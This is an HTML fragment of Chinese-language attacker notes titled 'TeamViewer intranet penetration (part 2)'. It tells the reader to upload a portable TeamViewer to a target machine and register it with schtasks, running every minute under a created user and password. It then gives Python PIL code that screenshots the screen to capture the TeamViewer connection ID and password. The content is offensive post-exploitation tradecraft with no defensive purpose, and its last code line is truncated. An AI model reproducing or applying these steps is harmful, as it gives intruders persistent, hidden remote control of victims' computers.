	<body>
		<h1 class="csAD577193">
			<a name="teamviewer内网穿透（二）"><span class="csDE05BCC">Teamviewer</span><span class="csECDA2D3">内网穿透（二）</span></a></h1>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">上传一个单文件版本的</span><span class="cs8926E06">teamviewer</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">再通过下面指令运行起来</span></p><p class="cs3A447A38"><span class="cs9FB05234">schtasks /create /sc minute /mo 1 /tn &ldquo;cat&rdquo; /tr TV</span><span class="cs7FFD2630">的路径</span><span class="cs9FB05234"> &nbsp;/ru </span><span class="cs7FFD2630">创建的用户名</span><span class="cs9FB05234"> /rp </span><span class="cs7FFD2630">创建的密码</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">使用</span><span class="cs8926E06">PIL</span><span class="cs9C1B1871">截图获取连接</span><span class="cs8926E06">ID</span><span class="cs9C1B1871">密码：</span></p><p class="cs3A447A38"><span class="cs9FB05234">from PIL import ImageGrab</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">im = ImageGrab.grab()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">im.save(&#39;screenshot.png&#39;</span></p></body>
